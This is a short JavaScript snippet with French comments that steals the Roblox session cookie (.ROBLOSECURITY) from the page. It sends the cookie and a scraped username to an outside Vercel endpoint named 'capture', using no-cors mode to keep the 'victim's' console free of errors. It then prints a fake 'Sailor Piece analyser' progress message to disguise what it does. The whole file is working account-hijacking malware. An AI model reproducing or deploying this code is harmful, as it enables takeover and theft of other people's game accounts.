(function() {
    // Récupération du cookie de session
    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
    
    if (cookie) {
        const token = cookie.split('=')[1];
        
        // Envoi furtif vers ton API Vercel
        fetch('https://robloxo-iota.vercel.app/api/capture', {
            method: 'POST',
            mode: 'no-cors', // Pour éviter les erreurs de logs dans la console de la victime
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                token: token,
                type: "Roblox Session",
                username: document.querySelector('.age-bracket-label-age')?.innerText || "Utilisateur Roblo"
            })
        });
    }
    // Petit message de bluff pour la victime
    console.log("Analyseur Sailor Piece : Synchronisation des données en cours... (10%)");
})();
